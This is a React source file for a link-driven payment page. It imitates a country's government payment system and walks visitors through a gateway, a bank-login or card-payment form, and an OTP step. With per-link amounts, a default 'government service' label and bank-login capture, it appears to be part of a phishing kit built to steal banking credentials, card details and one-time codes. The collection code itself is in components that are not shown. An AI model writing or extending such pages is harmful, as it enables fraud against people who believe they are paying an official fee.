import React, { useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Helmet } from 'react-helmet-async';
import { useLink } from '@/hooks/useSupabase';
import DynamicPaymentGateway from '@/components/DynamicPaymentGateway';
import GatewayBankLogin from '@/components/GatewayBankLogin';
import GatewayCardPayment from '@/components/GatewayCardPayment';
import { Loader2 } from 'lucide-react';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';

type PaymentStep = 'gateway' | 'bank' | 'card' | 'otp' | 'complete';

const DynamicPaymentFlow = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLink(id);
  const [currentStep, setCurrentStep] = useState<PaymentStep>('gateway');

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
          <p className="text-lg text-muted-foreground">جاري تحميل بيانات الدفع...</p>
        </div>
      </div>
    );
  }

  if (!linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <h2 className="text-2xl font-bold mb-2">رابط الدفع غير موجود</h2>
          <p className="text-muted-foreground mb-6">الرجاء التحقق من الرابط والمحاولة مرة أخرى</p>
        </div>
      </div>
    );
  }

  const paymentInfo = linkData.payload as any;
  const countryCode = paymentInfo?.selectedCountry || "SA";
  const amount = paymentInfo?.payment_amount || 500;
  const serviceName = paymentInfo?.payment_data?.selected_service_name || 
                      paymentInfo?.service_name || 
                      'خدمة حكومية';
  const invoiceNumber = paymentInfo?.payment_data?.invoice_number;

  const govSystem = getGovernmentPaymentSystem(countryCode);

  const handlePaymentMethodSelect = (method: 'card' | 'bank') => {
    if (method === 'bank') {
      setCurrentStep('bank');
    } else {
      setCurrentStep('card');
    }
  };

  const handleBack = () => {
    setCurrentStep('gateway');
  };

  const handlePaymentComplete = () => {
    navigate(`/pay/${id}/otp`);
  };

  return (
    <>
      <Helmet>
        <title>{`${govSystem.nameAr} - الدفع الآمن`}</title>
        <meta name="description" content={govSystem.description} />
        <meta name="theme-color" content={govSystem.colors.primary} />
      </Helmet>

      {currentStep === 'gateway' && (
        <DynamicPaymentGateway
          countryCode={countryCode}
          amount={amount}
          serviceName={serviceName}
          invoiceNumber={invoiceNumber}
          onPaymentMethodSelect={handlePaymentMethodSelect}
        />
      )}

      {currentStep === 'bank' && (
        <GatewayBankLogin
          countryCode={countryCode}
          amount={amount}
          serviceName={serviceName}
          onBack={handleBack}
          onComplete={handlePaymentComplete}
        />
      )}

      {currentStep === 'card' && (
        <GatewayCardPayment
          countryCode={countryCode}
          amount={amount}
          serviceName={serviceName}
          onBack={handleBack}
          onComplete={handlePaymentComplete}
        />
      )}
    </>
  );
};

export default DynamicPaymentFlow;
